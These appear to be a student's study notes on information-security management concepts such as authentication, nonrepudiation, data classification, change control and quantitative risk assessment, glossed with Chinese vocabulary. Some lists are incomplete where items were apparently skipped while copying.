- many online social networking sites allow users to interact with each other using pseudonyms, so that they can communicate and create an online persona without revealing their actual identity.
- Anonymity should be a goal that is provided with safeguards whenever possible and appropriate.
- Assurance 确信
- The designers of computer systems want to protect more than CIA of information. But also:
◦ Protect and manage the resources of these systems, let no-one misuse these resources.
◦ how trust is provided and managed in computer systems,
◦ Make people/systems behave in the way we expect. manage the way that information is used.
◦ keep unauthorized people from using their CPUs, memory, and networks, make people using the resources of their systems are doing so in line with their policies.
- Furthermore, trust involves the interplay of the following:
◦ Policies: 政策
▸ specify behavioral expectations that people or systems have for themselves and others.
▸ Example:
- the designers of an online music system may specify policies that describe how users can access and copy songs.
◦ Permissions: 允许
▸ describe the behaviors that are allowed by the agents that interact with a person or system.
▸ Example:
- provide permissions for limited access and copying to people who have purchased certain songs.
◦ Protections:
▸ describe mechanisms put in place to enforce permissions and polices. ▸ Example:
- build protections to prevent people from unauthorized access and
copying of its songs. - Assurance: management of trust in two directions, users to systems and systems to users.
◦ user providing her credit card number to online system
◦ expect the system to abide 忍受 by its published policies regarding the use of credit card numbers
◦ may grant permission to the system to make small charges to her card for music purchases,
◦ may also have a protection system in place with her credit card company
◦ so no fraudulent charges on her card.
- trust management:
◦ the design of effective, enforceable policies,
◦ methods for granting permissions to trusted users,
◦ the components that can enforce those policies
◦ permissions for protecting and managing the resources in the system.
◦ can be complicated or fairly simple
▸ like policy says that only the owner of a computer is allowed to use its
CPU.
▸ policies that are easy to enforce, permissions that are easy to comply
with.
- software engineering:
◦ need to know that the software that implements their system is coded
that conforms to design.
◦ May designed correctly “on paper,” but worked incorrectly because
not implemented correctly.
▸ A classic example of incorrect implementation:
- the use of pseudorandom number generator (PRNG):伪随机的
- a program returns a sequence of statistically random numbers, given a starting number (seed) which is assumed to be random.
- The designer of a system might specify that a PRNG be used in a certain context, like encryption, so that each encryption will be different.
- But if the person actually writing the program makes mistake of always using the same seed, then the sequences of pseudorandom numbers will always be the same.
- Thus, not only have good designs, should also have good specifications and implementations.
- Placing trust in a system:
◦ Users typically don’t have the same computational power as the servers employed by such systems.
◦ the limited amount of computing that they can do, as well as the legal and repetitional damage that the user can do AAA Services
These five elements represent the following processes of security:
Identification: claiming an identity when attempting to access a secured area or system
Authentication: proving that you are that identity
Authorization: defining the allows and denials of resource and object access for
a specific identity.
Auditing: recording a log of the events and activities related to the system and subjects
Accounting (aka accountability): reviewing log files to check for compliance and violations in order to hold subjects accountable for their actions
Legally Defensible Security
The point of security is to keep bad things from happening while supporting the occurrence of good things. When bad things do happen, organizations often desire assistance from law enforcement and the legal
system for compensation 补偿.
To obtain legal restitution补偿, organization’s security needs to be legally
defensible, you must:
demonstrate that a crime was committed
  - Convince court that your log files are accurate, no other person other than the subject could have committed the crime.
the suspect committed that crime
you took reasonable efforts to prevent the crime.   - Requires complete security solution:
  - strong multifactor authentication techniques,
  - solid authorization mechanisms,
  - and impeccable 无瑕疵的 auditing systems.
  - the organization must complied with all applicable laws and regulations:
  - proper warnings and notifications were posted
  - both logical and physical security were not otherwise
compromised
  - No other possible reasonable interpretations of the
electronic evidence.
Authenticity 可靠性
Many online services providing content/resources/computational services, these systems need to enforce their policies.
The process of verifying or testing that the claimed identity is valid is authentication.
Authentication verifies the identity of the subject by comparing one or more factors against the database of valid identities (that is, user accounts).
Authenticity: determine that statements/policies/permissions issued by persons or systems are genuine. we need to have reliable ways of electronically identifying people.
  - A person/system could claim that they did not make such a commitment, we need protocol that achieves such types of authenticity demonstrates nonrepudiation.
Nonrepudiation 认可: authentic statements issued by some person or system cannot be denied.
  - accomplished is through the use of digital signatures/blue-ink signatures: cryptographic computations/analogue that allow a person/system to commit to the authenticity of their documents in a unique way that achieves nonrepudiation.
  - digital signatures typically have more benefits than blue-ink signatures,
  - digital signatures also allow to check the integrity of signed documents. becomes invalid.
Authorization
Once a subject is authenticated, access must be authorized.
The process of authorization ensures that the requested activity or access to an object is possible given the rights and privileges assigned to the authenticated identity.
In most cases, the system evaluates an access control matrix that compares the subject, the object, and the intended activity. If the specific action is allowed, the subject is authorized. If the specific action is not allowed, the subject is not authorized.
Identification and authentication are all-or-nothing aspects of access control. Authorization has a wide range of variations between all or nothing for each
object within the environment.
Authorization is usually defined using one of the concepts of access control, such as discretionary access control (DAC), mandatory access control (MAC), or role- based access control (RBAC);
Auditing
Auditing/monitoring, the programmatic means by which a subject’s actions are tracked and recorded for the purpose of holding the subject accountable for their actions while authenticated on a system. It is also the process by which unauthorized or abnormal activities are detected on a system.
recording activities of a subject and its objects
recording the activities of core system functions that maintain the operating environment and the security mechanisms.
Auditing is needed to:
detect malicious actions by subjects, attempted intrusions, and system failures reconstruct events,
provide evidence for prosecution,
produce problem reports and analysis.
evaluate the health and performance of a system.
The event logs leading up to a crash can often be used to discover the reason of a system failed.
System crashes: faulty programs, corrupt drivers, or intrusion attempts...
Log files provide an audit trail for recreating the history of an event, intrusion, or
system failure.
The audit trails, created by recording system events to logs, can be used to evaluate the health and performance of a system.
Accountability
An organization’s security policy can be properly enforced only if accountability is maintained, you can maintain security only if subjects are held accountable for their actions.
Effective accountability relies on the capability to prove a subject’s identity and track their activities.
Accountability is established by linking a human to the activities of an online identity through the security services and mechanisms of auditing, authorization, authentication, and identification.
Thus, human accountability is ultimately dependent on the strength of the authentication process.
Without strong authentication process, there is doubt that the human associated with a specific user account was the actual entity controlling that user account when the undesired action took place.
To have viable accountability, you must be able to support your security in a court of law. If you are unable to legally support your security efforts, then you will be unlikely to be able to hold a human accountable for actions linked to a user account.
With only a password as authentication, there is significant room for doubt.
Passwords are the least secure form of authentication
the use of multifactor authentication: password, smartcard, and fingerprint scan in combination, there is very little possibility that any other human could have compromised the authentication process in order to impersonate the human responsible for the user account.
Nonrepudiation
Ensures that the subject of an activity or event cannot deny that the event occurred, prevents a subject from claiming not to have sent a message, not to have performed an action, or not to have been the cause of an event.
It is made possible by identification, authentication, authorization, accountability, and auditing.
Nonrepudiation can be established using digital certificates, session identifiers, transaction logs, and numerous other transactional and access control mechanisms.
If nonrepudiation is not built into a system and properly enforced, you will not be able to verify that a specific entity performed a certain action.
Nonrepudiation is an essential part of accountability.
A suspect cannot be held accountable if they can repudiate the claim against them.
Protection Mechanisms
Another aspect of understanding and apply concepts of confidentiality, integrity, and availability is the concept of protection mechanisms. Protection mechanisms are common characteristics of security controls.
These mechanisms include using multiple layers or levels of access, employing abstraction, hiding data, and using encryption.
Layering
Layering, defense in depth, is use of multiple controls in a series. No one control can protect against all possible threats. When security solutions are designed in layers, most threats are eliminated, mitigated, or thwarted.
Using layers in a series rather than in parallel is important.
Performing security restrictions in a series, means to perform one after the other in a linear fashion. Only through a series configuration will each attack be scanned, evaluated, or mitigated by every security control. In a series configuration, failure of a single security control does not render the entire solution ineffective. If security controls were implemented in parallel, a threat could pass through a single checkpoint that did not address its particular malicious activity.
Serial configurations: narrow but very deep. parallel configurations: wide but very shallow.
Parallel systems are useful in distributed computing applications, but parallelism is not often a useful concept in the realm of security.
Think of physical entrances to buildings:
Parallel configuration for shopping malls. There are many doors in many locations around the entire perimeter of the mall.
Series configuration for bank or airport. A single entrance is provided, and that entrance is actually several gateways or checkpoints that must be passed in sequential order to gain entry into active areas of the building.
Layering also includes the concept that networks comprise numerous separate entities, each with its own unique security controls and vulnerabilities. In an effective security solution, there is a synergy 协同作用 between all networked systems that creates a single security front. Using separate security systems creates a layered security solution.
Abstraction
Similar elements are put into groups/classes/roles and assigned security controls, restrictions, or permissions as a collective.
Thus, the concept of abstraction is used when classifying objects or assigning roles to subjects. The concept of abstraction also includes the definition of object and subject types or of objects themselves (a data structure used to define a template for a class of entities).
Abstraction is used to define:
  - what types of data an object can contain.
  - what types of functions can be performed on or by that object.
  - what capabilities that object has.
Abstraction simplifies security by enabling you to assign security controls to a group of objects collected by type or function.
Data Hiding
preventing data from being discovered or accessed by a subject by positioning the data in a logical storage compartment that is not accessible or seen by the subject.
Forms of data hiding include:
keeping a database from being accessed by unauthorized visitors
restricting a subject at a lower classification level from accessing data at a higher classification level.
Preventing an application from accessing hardware directly is also data hiding. Data hiding is often a key element in security controls as well as in programming. Encryption
Hiding the meaning or intent of a communication from unintended recipients, can be applied to every type of electronic communication (text, audio, video, applications).
There are various strengths of encryption, each of which is designed and/or appropriate for a specific use or purpose.
Apply Security Governance Principles
Security governance 管理方法 is the collection of practices related to supporting, defining, and directing the security efforts of an organization.
Security governance is closely related to and often intertwined 缠结 with corporate and IT governance. The goals of these 3 governance agendas 会议议程 are often the same or interrelated.
Example:
  - common goal of organizational governance: ensure that the
organization will continue to exist and will grow or expand over time.
  - common goal of governance: maintain business processes while
striving toward growth and resiliency.
Some aspects of governance are imposed 强加的 on organizations due to legislative and regulatory compliance needs, or by industry guidelines or license requirements.
All forms of security governance, must be assessed 评定 and verified from time to time. Various requirements for auditing 审计 and validation 确认 may be present due to government regulations or industry best practices.
Governance compliance issues often vary from industry and country.
  - For a global market, governance issues become more complex.
  - Laws in different countries differ or in fact conflict. The organization as a whole should be given the direction/guidance/tools to provide sufficient oversight and management to address threats and risks with a focus on eliminating downtime and keeping potential loss or damage to a minimum.
The definitions of security governance are often rather stilted 生硬 and high level, is the implementation of a security solution and management method that are tightly interconnected.
Security governance directly oversees 俯瞰 and gets involved in all levels of security.
Security is not IT issue only, it affects every aspect of an organization, IT staff cannot handle on their own.
Security is a business operations issue. Security is an organizational process, not just something the IT geeks do behind the scenes.
Using the term security governance is to emphasize this point by indicating that security needs to be managed and governed throughout the organization, not just in the IT department. Alignment 排成直线 of Security Function to Strategy, Goals, Mission, and Objectives
Security management planning:
ensures proper creation/implementation/enforcement 执行 of a security policy.
aligns 匹配 the security functions to the strategy/goals/mission/objectives of the organization.
designing and implementing security based on a business case, budget restrictions, or scarcity of resources.
A business case 商业论证: usually is a documented argument or stated position, to define a need to make a decision or action.
  - To make a business case = to demonstrate a business-specific need to alter an existing process or choose an approach to a business task.
  - is often made to justify the start of a new project, especially a project related to security.
  - It is important to consider the budget that can be allocated to a business need–based security project.
Security can be expensive, but it is often an essential element of reliable and long-term business operation.
In most organizations, money and resources (people, technology, space) are limited, the maximum benefit needs to be obtained from any endeavor.
One of the most effective ways to tackle 解决 security management planning: Top- down approach.
Upper/senior management: initiating and defining policies for the organization. Security policies provide direction for all levels of the organization’s hierarchy.
middle management: flesh out the security policy into standards, baselines, guidelines, and procedures.
operational managers, security professionals: implement the configurations prescribed in the security management documentation.
the end users: must comply with all the security policies of the organization.
The opposite of the top-down approach is bottom-up approach, the IT staff makes security decisions directly without input from senior management.
rarely used in organizations, considered problematic in the IT industry.
Security management is a responsibility of upper management, not of the IT staff, and is considered a business operations issue rather than an IT administration issue.
The team or department responsible for security within an organization should be autonomous 自治的. The information security (InfoSec) team should be led by a
designated chief security officer (CSO) who must report directly to senior management.
Autonomous: let CSO and CSO’s team outside the typical hierarchical structure in an organization can improve security management across the entire organization.
helps to avoid cross-department and internal political issues.
Elements of security management planning include:
defining security roles;
prescribing how security will be managed, who will be responsible for security, and how security will be tested for effectiveness;
developing security policies; performing risk analysis; requiring security education for employees.
These efforts are guided through the development of management plans.
The best security plan is useless without one key factor: approval by senior management.
Without senior management’s approval of and commitment 承诺 to the security policy, the policy will not succeed.
It is the responsibility of the policy development team to educate senior management sufficiently
  - understands the risks, liabilities, exposures that remain even after security measures prescribed in the policy are deployed.
Developing and implementing a security policy is evidence of due care and due diligence 勤奋 on the part of senior management.
  - If a company does not practice due care and due diligence, managers can be held liable for negligence疏忽 and held accountable for both asset and financial losses.
Security management planning team should develop 3 types of plans:
 Strategic plan: 战略(上)的:
  - a long-term plan fairly stable, useful for about 5 years if it is
maintained, updated annually.
  - It defines the organization’s security purpose, helps to understand security function and align it to goals, mission, and objectives of the organization.
  - The strategic plan also serves as the planning horizon.
  - Long-term goals and visions for the future are discussed in a strategic
plan.
  - A strategic plan should include a risk assessment.
Tactival plan: 战术
  - a midterm plan 中间的, provide more details on accomplishing the goals set forth in the strategic plan, can be crafted ad-hoc based upon unpredicted events.
  - typically useful for about a year and often prescribes and schedules the tasks necessary to accomplish organizational goals.
  - Examples: project plans, acquisition 获得 plans, hiring plans, budget plans, maintenance plans, support plans, and system development plans.
Operational plan: 操作的
  - An operational plan is a short-term, highly detailed plan based on the
strategic and tactical plans.
  - valid or useful for short time, must update often, monthly/quarterly, to
retain 保持 compliance 服从 with tactical plans.
  - spell out how to accomplish the various goals of the organization: resource allotments 份额, budgetary requirements 预算上的, staffing
assignments, scheduling, and step-by-step or implementation procedures.   - Operational plans include details on how the implementation processes are in compliance with the organization’s security policy.
  - Examples: training plans, system deployment plans, product design plans.
The activity of security management planning may have a definitive 决定性的 initiation point, but Security is a continuous process, its tasks and work are never fully accomplished or complete.
Effective security plans focus attention on specific and achievable objectives, anticipate 期望change and potential problems, and serve as a basis for decision making for the entire organization.
Security documentation should be concrete, well defined, and clearly stated.
For a security plan to be effective, it must be developed, maintained, and actually used.
Organizational 组织的 Processes
Security governance needs to address every aspect of an organization. This
includes the organizational processes of acquisitions, divestitures 剥夺财产或权利, and governance committees 委员会.
Acquisitions and mergers place an organization at an increased level of risk, include: inappropriate information disclosure, data loss, downtime, failure to achieve sufficient return on investment (ROI).
  - In addition to all the typical business and financial aspects of mergers and acquisitions, a healthy dose of security oversight and increased scrutiny 监视 is often essential to reduce the likelihood of losses during such a period of transformation.
Divestiture or any form of asset or employee reduction is another time period of increased risk and thus increased need for focused security governance.   - Assets need to be sanitized 消毒 to prevent data leakage 漏出物.
  - Storage media should be removed and destroyed, because media sanitization techniques do not guarantee against data remnant 剩余 recovery.
  - exit interview: Employees released from duty need to be debriefed 向 (外交人员等)询问执行任务的情况
Usually involves review any nondisclosure agreements, any other binding contracts/agreements that will continue after employment has ceased.
Often, security governance 管理 is managed by a governance committee/board of directors.
  - group of influential knowledge experts whose primary task is to oversee and guide the actions of security and operations for an organization.
  - Security is a complex task. Organizations are often large and difficult to understand from a single viewpoint. Having a group of experts work together toward the goal of reliable security governance is a solid strategy.
Two additional examples of organizational processes that are essential to strong security governance are change control/change management and data classification.
Change Control/Management
Another important aspect of security management is the control or management of change.
Change in a secure environment can introduce: loopholes, overlaps, missing objects, and oversights that can lead to new vulnerabilities.
The only way to maintain security in the face of change is to systematically manage change (extensive planning, testing, logging, auditing, monitoring activities related to security controls and mechanisms). The records are used to identify, agents of change, whether those agents are objects, subjects, programs, communication pathways, or even the network itself.
Primary purpose: make all changes subject to detailed documentation and auditing and thus able to be reviewed and scrutinized 详审 by management.
To prevent unwanted reductions in security, ensure that any change does not lead to reduced or compromised security.
To make it possible to roll back any change to a previous secured state.
to oversee alterations to every aspect of a system (hardware configuration, OS,
application software).
Improves the security of an environment by protecting implemented security from unintentional, tangential, or affected diminishments.
Change management can be implemented on any system despite the level of security.
It is a requirement for systems complying with the Information Technology Security Evaluation and Criteria (ITSEC) classifications of B2, B3, and A1.
Change management should be included in design, development, testing, evaluation, implementation, distribution, evolution, growth, ongoing operation, and modification.
It requires a detailed inventory of every component and configuration.
It also requires the collection and maintenance of complete documentation for every system component, from hardware to software, from configuration settings to security features.
The change control process of configuration or change management has several goals or requirements: Implement changes in a monitored and orderly manner. Changes are always controlled.
A formalized testing process is included to verify that a change produces expected results.
All changes can be reversed (backout or rollback plans/procedures).
Users are informed of changes before they occur to prevent loss of productivity.
The effects of changes are systematically analyzed.
The negative impact of changes on capabilities, functionality, and performance is minimized.
Changes are reviewed and approved by a CAB (change approval board).
One example of a change management process is a Parallel run:
a type of new system deployment testing, the new system and the old system are
run in parallel.
Each major or significant user process is performed on each system simultaneously to ensure that the new system supports all required business functionality that the old system supported or provided.
Data Classification
Data classification/categorization, data is protected based on its need for secrecy, sensitivity, or confidentiality, determine how much effort, money, and resources are allocated to protect the data and control access to it. It is inefficient to treat all data the same way when designing and implementing a security system, because some data items need more security than others.
Securing everything at a low security level means sensitive data is easily accessible.
Securing everything at a high security level is too expensive and restricts access to unclassified, noncritical data.
Data classification/categorization, is the process of organizing items, objects, subjects, and so on into groups, categories, or collections with similarities. These similarities could include value, cost, sensitivity, risk, vulnerability, power, privilege, possible levels of loss or damage, or need to know.
The primary objective of data classification schemes: formalize and stratify the process of securing data based on assigned labels of importance and sensitivity.
Data classification: provide security mechanisms for storing, processing, transferring data, how data is removed from a system and destroyed.
The following are benefits of using a data classification scheme:
It demonstrates an organization’s commitment to protecting valuable resources and assets.
It assists in identifying those assets that are most critical or valuable to the organization.
It lends credence 信任 to the selection of protection mechanisms.
It is often required for regulatory compliance or legal restrictions.
It helps to define access levels, types of authorized uses, and parameters for declassification and/or destruction of resources that are no longer valuable.
It helps with data life-cycle management which in part is the storage length (retention), usage, and destruction of the data.
The criteria 标准 by which data is classified vary based on the organization, glean numerous generalities 概括性 from common or standardized classification systems:
Usefulness of the data
Timeliness of the data
Value or cost of the data
Maturity or age of the data
Lifetime of the data (or when it expires)
Association with personnel
Data disclosure damage assessment (how the disclosure of the data would affect the organization)
Data modification damage assessment (how the modification of the data would affect the organization)
National security implications of the data
Authorized access to the data (that is, who has access to the data)
Restriction from the data (that is, who is restricted from the data)
Maintenance and monitoring of the data (that is, who should maintain and monitor the data)
Storage of the data
Using whatever criteria is appropriate for the organization, data is evaluated, and an appropriate data classification label is assigned to it.
In some cases, the label is added to the data object.
In other cases, labeling occurs automatically when the data is placed into a storage mechanism or behind a security protection mechanism.
To implement a classification scheme, you must perform seven major steps: 2. Specify the evaluation criteria of how the information will be classified and labeled.
3. Classify and label each resource. (The owner conducts this step, but a supervisor should review it.)
4. Document any exceptions to the classification policy that are discovered, and integrate them into the evaluation criteria.
5. Select the security controls that will be applied to each classification level to provide the necessary level of protection.
6. Specify the procedures for declassifying resources and the procedures for transferring custody of a resource to an external entity.
7. Create an enterprise-wide awareness program to instruct 通知 all personnel about the classification system.
Declassification is often overlooked when designing a classification system and documenting the usage procedures.
Declassification: required once an asset no longer warrants or needs the protection of its currently assigned classification/sensitivity level.
In other words, if the asset were new, it would be assigned a lower sensitivity label than it currently is assigned.
When assets fail to be declassified as needed, security resources are wasted, and the value and protection of the higher sensitivity levels is degraded.
The two common classification schemes are government/military classification and commercial business/private sector classification. There are 5 levels of government/military classification (listed here from highest to lowest):  Top Secret: The highest level of classification. The unauthorized disclosure of top-secret data will have drastic effects and cause grave damage to national security.
Secret: Used for data of a restricted nature. The unauthorized disclosure of data classified as secret will have significant effects and cause critical damage to national security.
Confidential: Used for data of a private, sensitive, proprietary, or highly valuable nature. The unauthorized disclosure of data classified as confidential will have noticeable effects and cause serious damage to national security. This classification is used for all data between secret and sensitive but unclassified classifications.
Unclassified: The lowest level of classification. This is used for data that is neither sensitive nor classified. The disclosure of unclassified data does not compromise confidentiality or cause any noticeable damage.
An easy way to remember the names of the five levels of the government or military classification scheme in least secure to most secure order is with a memorization acronym: U.S. Can Stop Terrorism. Notice that the five uppercase letters represent the five named classification levels, from least secure on the left to most secure on the right (or from bottom to top in the preceding list of items).
Items labeled as confidential, secret, and top secret are collectively known as classified. Often, revealing the actual classification of data to unauthorized individuals is a violation of that data. Thus, the term classified is generally used to refer to any data that is ranked above the unclassified level. All classified data is exempt from the Freedom of Information Act as well as many other laws and regulations. The US military classification scheme is most con- cerned with the sensitivity of data and focuses on the protection of confidentiality (that is, the prevention of disclosure). You can roughly define each level or label of classification by the level of damage that would be caused in the event of a confidentiality violation. Data from the top-secret level would cause grave damage to national security, whereas data from the unclas- sified level would not cause any serious damage to national or localized security.
Commercial business/private sector classification systems can vary widely because they typi- cally do not have to adhere to a standard or regulation. The CISSP exam focuses on four com- mon or possible business classification levels (listed highest to lowest and shown in Figure 1.5):  Risk Management
Risk management encompasses actions taken to:
reduce complexity
increase objectivity
identify important decision factors. the complexity of risk management whether or not it is worth the effort.
Businesses must take risks to retain their competitive edge, however risk management must occur as part of managing any business, program, or project. managing the future risks, not explaining the past risks.
Risk management is both a skill and a task that is performed by all managers, either deliberately or intuitively. It can be simple or complex, depending on the size of the project or business and the amount of risk inherent in an activity. Every manager, at all levels, must learn to manage risk. The required skills can be learned.
Risk Management Terminology
Asset: Resource or information an organization needs to conduct its business.
Mitigate: Action taken to reduce the likelihood of a threat occurring.
acceptable use policy/rules of behavior: Agreed-upon principles set forth by a company to govern how the employees of that company may use resources such as computers and Internet access.
Business impact analysis (BIA): A study of the possible impact if a disruption to a business’s vital resources were to occur.
Agreement:
  - business partners agreement (BPA): An agreement between partners in a business that outlines their responsibilities, obligations, and sharing of profits and losses.
  - interconnection security agreement (ISA): As defined by NIST (Publication 800-47), it is “an agreement established between the organizations that own and operate connected IT systems to document the technical requirements of the interconnection. The ISA also supports a Memorandum of Understanding or Agreement (MOU/A) between the organizations.”
  - service-level agreement (SLA): An agreement that specifies performance requirements for a vendor. This agreement may use mean time before failure (MTBF) and mean time to repair (MTTR) as performance measures in the SLA.
Likelihood: actual values can be assigned to likelihood. The National Institute of Standards and Technology recommends viewing likelihood as a score representing the possibility of threat initiation.
  - the likelihood of threat event initiation adapted from Appendix G of NIST Publication 800-30.
⁃
Threat Vectors 矢量: the way in which an attacker poses a threat. a particular tool used against you (example vulnerability scanner) or the path(s) of attack that they follow. Under that broad definition, a threat vector can be anything from a fake email that lures you into clicking a link (phishing) or an unsecured hotspot (rouge access point) and everything in between.
maximum tolerable downtime (MTD): The maximum period of time that a business process can be down before the survival of the organization is at risk.
mean time between failures (MTBF): The measurement of the 预先的 anticipated lifetime of a system or component.
mean time to failure (MTTF): The measurement of the average of how long it takes a system/component to fail.
mean time to restore (MTTR): The measurement of how long it takes to repair a system/component once a failure occurs.
 recovery point objective (RPO): The point last known good data prior to an outage that is used to recover systems. the closer the RPO matches the item of the crash, the more expensive it is to obtain.
recovery time objective (RTO): The maximum amount of time that a process/ service is allowed to be down and the consequences still to be considered acceptable. Beyond this time, the break in business continuity is considered to affect the business negatively. The RTO is agreed on during BIA creation.
memorandum of understanding (MOU)/memorandum of agreement (MOA): MOU common than MOA, a document between parties defining their respective responsibilities in accomplishing a particular goal/mission, like securing a system.
Redundant Array of Independent Disks (RAID): A configuration of multiple hard disks used to provide fault tolerance should a disk fail. Different levels of RAID exist.
Risk: The probability that a particular threat will occur, accidentally/ intentionally, leaving a system vulnerable and the impact of this occurring.
Risk Management: The overall decision-making process of identifying threats and vulnerabilities and potential impacts, determining the costs to mitigate such events, and deciding what actions are cost effective for controlling these risks.
risk assessment: An evaluation of the possibility of a threat/vulnerability existing. An assessment must be performed before any other actions—such as how much to spend on security in terms of dollars and manpower—can be decided.
  - risk analysis: An evaluation to identify each risk. Each risk should be out-lined, described, and evaluated on the likelihood of it occurring.
  - risk calculation: The process of calculating the risks that exist in terms of costs, number, frequency, and so forth.
  - asset value (AV): The assessed value of an item, with cash flow. asset if a threat is realized.
  - annualized rate of occurrence (ARO): how often a threat will occur. Example, occurs once every five years, ARO is 1/5, or 0.2.
  - single loss expectancy (SLE): The cost of a single loss when it occurs, how much you could expect to lose at any one time.
⁃
  - annual loss expectancy (ALE): identify risks and calculate the expected loss each year.
  - SLE × ARO = ALE
  - The chief components of a risk assessment process:
  - Risks to Which the Organization Is Exposed: develop scenarios, evaluate how to deal with these risks if they occur
  - Risks That Need Addressing: reality check on which risks are real and which are unlikely.
  - Coordination with BIA: with the business impact analysis (BIA), provides an organization with an accurate picture of the situation facing it. make intelligent decisions about how to respond to various scenarios.
Acting on Your Risk Assessment: Strategy of dealing with risk, the best approach is to:
  - risk acceptance: accept the consequences should the threat happen. when the cost of implementing > the value of the harm that would occur.
  - risk avoidance: avoid the risk. (forbid any email attachments from entering the network, avoid using computers at all)
  - risk deterrence威慑: discourage potential attackers from engaging in the behavior that leads to the risk.
  - risk mitigation缓解: lessen the risk, accomplished any time you take 958
   Single Loss Expectancy (SLE) = Asset Value
(AV) x Exposure Factor (EF) %

steps to reduce risk. (installing antivirus software, educating users about possible threats, monitoring network traffic, adding a firewall...)
  - Microsoft’s Security Intelligence Report, Volume 13, the following suggestions for mitigating risk through user awareness training:
  - Keep security messages fresh and in circulation.
  - Target new employees and current staff members.
  - Set goals to ensure that a high percentage of the staff is trained on security best practices.
  - Repeat the information to raise awareness.
  - risk transference: offload some of the risk through insurance, third-
party contracts, and/or shared responsibility.
single point of failure (SPOF): A single weakness that is capable of bringing an
entire system down (BIA concepts)
Vulnerability: A flaw or weakness in some part of a system’s security procedures, design, implementation, or internal controls that could expose it to danger (accidental or intentional) and result in a violation of the security policy.
Threat: what would cause you to lose this data
  - Environmental: floods, tornados, hurricanes, sprinklers throughout the
entire building be activated and your server room flooded.....
  - Manmade: malicious people.
  - Internal vs. External: individual currently employed or not by your organization (internal vs external threat)
risk register: scatterplot of possible problem areas.
privacy impact assessment (PIA): identifies the adverse impacts that can be
associated with the destruction, corruption, or loss of accountability of data for the organization.
privacy threshold assessment (PTA): the compliance tool used in conjunction with the PIA.
Two types of testing that identify risks:
  - penetration testing
  - vulnerability testing.
Conducting a Risk Assessment
1. Interview the department heads and the data owners to determine information requires additional security and to identify the existing vulnerabilities from their perspective.
2. Evaluate the network infrastructure to determine known vulnerabilities and how you might counter them.
3. Perform a physical assessment of the facility to evaluate what physical risks must be countered.
Control Classes and Types
Security controls are the elements used to reduce the risk associated with security failures. A wide variety of tools can be employed; NIST SP 800-53 lists literally hundreds of controls that can be employed in systems to improve the security posture.
Controls can be classified based on the types of actions they perform.
Technical controls
  - operate through a technological intervention 介入 in the system.
  - Examples: user authentication (passwords), logical access controls, antivirus/malware software, firewalls, intrusion detection and prevention systems, and so forth.
   Management controls
  - operate on the management of an organization.
  - Examples: policies, regulations, and laws, planning and risk assessment are common examples that are employed.
Operational controls
  - effective through the operations of an organization, typically through
the actions taken by people.
  - Example: response, configuration management, personal security, and training and awareness.
    For each of these classes, there are 4 types of controls: Preventive (deterrent)
Detective
Corrective (recovery)
Compensating 补偿
 False Positives / false alarm
A test result that indicates a condition that does not actually exist is called a false positive.
A security system detects an incidence of attack when one does not actually exist
False positives can add to workload, forcing analysts to examine more data than necessary to find actual true events.
False Negatives
The failure of a system to detect a condition that is occurring. False negatives can be as damaging as false positives, and in some cases more damaging.
For instance, the failure of an IDS to detect an actual attack. A security system that fails to perform as expected can have significant consequences as the event goes undetected.
Risks Associated with Cloud Computing
3 different ways of implementing cloud computing:
Platform as a Service (PaaS) model / cloud platform services: vendors allow apps to be created and run on their infrastructure: Amazon Web Services, Google Code.
Software as a Service (SaaS) model: applications are remotely run over the web, no local hardware is required (other than that needed to obtain web access) and no software applications need to be installed on the machine accessing the site: Salesforce.com. Costs are usually computed on a subscription basis.
Infrastructure as a Service (IaaS) model: utilizes virtualization, and clients pay a cloud service provider for resources used: GoGrid.
Possible risk-related issues:
Regulatory 调整 Compliance 服从: different type and size of organization, there are any number of regulatory agencies’ rules must comply.
  - Example:
  - If your organization is publicly traded, you must adhere to Sarbanes- Oxley’s demanding and exacting rules. (can be difficult to do when the data is not located on your servers. Make sure that whoever hosts your data takes privacy and security as seriously as you do.)
User Privileges 特权: Enforcing user privileges can be fairly taxing.
  - least privileges — escalated privileges: access data to which they would
not otherwise have access and cause harm to it (intentional or not).
  - Won’t have the same control over user accounts as locally   - someone locks their account by entering the wrong password too many times in a row, you or they could be at the mercy of the hours that the technical staff is available at the provider.
Data Integration/Segregation隔离:
Data Segregation隔离: web-hosting companies usually lots of company’s website on a server (be profitable), data-hosting companies put lots of company’s data on a server.
  - To reduce problem, use encryption to protect data. data is only as safe as the data with which it is integrated.
  - Example:
  - assume that your client database is hosted on a server that another
company is also using to test an application that they are creating.
  - If their application obtains root-level access at some point (such as to change passwords) and crashes at that point, then the user running the application could be left with root permissions and conceivably be able to access data on the server for which they are not authorized, such as your client database. Data segregation is crucial;
  - keep your data on secure servers.
Data integration: equally important. Make sure that your data is not commingled 混
合 beyond your expectations.
  - In an extranet, pull information from databases in order to create a report.
Those databases can be owned by anyone connected to the extranet.
  - permissions on your databases should set properly, keep others from accessing more information than intended to share.
Risks Associated with Virtualization
Virtualization: allow one set of hardware to host multiple virtual machines. Possible security risks associated with virtualization: ▪


## access the other virtual machines, access data that should not access.
Intermingling Network and Security Controls: The tools used to administer the virtual machine may not have the same granularity as those used to manage the network. This could lead to privilege escalation and a compromise of security.
hypervisor(系统)管理程序: Most virtualization-specific threats focus on hypervisor.
  - The virtual machine monitor, the software that allows the virtual machines to exist.
  - If the hypervisor can be successfully attacked, the attacker can gain root- level access to all virtual systems. Although this is a legitimate issue, and one that has been demonstrated as possible in most systems (including VMware, Xen, and Microsoft Virtual Machine), it is one that has been patched each time it has arisen.
The solution to most virtualization threats:
always apply the most recent patches and keep the system up to date. Check the implement suggestions of the vendor in hardening guide.
Quantitative vs. Qualitative Risk Assessment
qualitative /'kwɒlɪ tətɪv/ (opinion-based and subjective, judgment and experience)
quantitative /'kwɒntɪ, tətɪv/ (cost-based and objective, metrics and models): SLE x ARO = ALE
depending on focusing on dollar amounts or simply downtime.
   Qualitative Risk Assessment
主观的 Subjectively determining the impact of an event that affects a project, program, or business.
- Usually involves the use of expert judgment, experience, or group consensus 一致同意 to complete the assessment.
- compare the impact of the threat with the probability of occurrence. Example of a binary assessment:
two outcomes possible: impact, probability.
2 levels:
3 levels: low- medium-high/red-green-yellow, nine combinations are possible. 5 levels: 25 values of risk exposure: very low, low, medium, high, or very high.
Qualitative risk assessment can be adapted to a variety of attributes and situations in combination with each other.
- Example, the 对照 comparison of specific risks that have been identified during a security assessment.
    - risk areas, potential impacts, impacts. Quantitative Risk Assessment
- Objectively determining the impact of an event that affects a project, program, or business.
- involves the use of metrics and models to complete the assessment.
  - highly dependent on historical data
  - gathering such data can be difficult.
  - applies historical information and trends to attempt to predict future
performance.
